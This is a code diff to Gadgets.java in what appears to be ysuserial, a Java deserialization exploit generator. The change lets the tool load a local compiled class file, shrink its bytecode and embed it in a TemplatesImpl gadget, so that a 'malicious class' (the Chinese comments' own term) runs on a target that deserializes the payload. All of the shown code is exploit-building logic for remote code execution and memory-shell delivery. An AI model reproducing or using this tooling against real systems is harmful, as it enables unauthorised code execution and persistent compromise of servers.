@@ -7,6 +7,7 @@ import static org.su18.ysuserial.payloads.templates.MemShellPayloads.*;
 import static org.su18.ysuserial.payloads.util.ClassNameUtils.generateClassName;
 import static org.su18.ysuserial.payloads.util.Utils.*;
 
+import java.io.FileInputStream;
 import java.lang.reflect.*;
 import java.util.*;
 
@@ -143,11 +144,21 @@ public class Gadgets {
 			return createTemplatesImpl(clazz, null, null, type, tplClass, abstTranslet, transFactory);
 			// 如果命令以 LF- 开头 （Local File），则程序可以生成一个能加载本地指定类字节码并初始化的逻辑，后面跟文件路径-类名
 		} else if (command.startsWith("LF-")) {
+			String className;
 			command = command.substring(3);
-			// base64 decode and
-			byte[] bs        = base64Decode(command.split("[-]")[0]).getBytes();
-			String className = command.split("[-]")[1];
-			return createTemplatesImpl(null, null, bs, className, tplClass, abstTranslet, transFactory);
+			String[] cmd = command.split("[-]");
+
+			ClassPool pool    = ClassPool.getDefault();
+			CtClass   ctClass = pool.makeClass(new FileInputStream(cmd[0]));
+
+			if (cmd.length > 1) {
+				className = cmd[1];
+			} else {
+				className = ctClass.getName();
+			}
+
+			shrinkBytes(ctClass);
+			return createTemplatesImpl(null, null, ctClass.toBytecode(), className, tplClass, abstTranslet, transFactory);
 		} else {
 			// 否则就是普通的命令执行
 			return createTemplatesImpl(null, command, null, null, tplClass, abstTranslet, transFactory);
@@ -252,6 +263,9 @@ public class Gadgets {
 			// 不搞那么麻烦写 if else 了，有长度需求自己再改吧
 			if (IS_INHERIT_ABSTRACT_TRANSLET) {
 				shrinkBytes(ctClass);
+
+				// 如果恶意类自身没有父类，可以简简单单通过 setSuperclass，能降低很大的长度
+//				ctClass.setSuperclass(superClass);
 				bytes = ctClass.toBytecode();
 				cName = ctClass.getName();
 			}
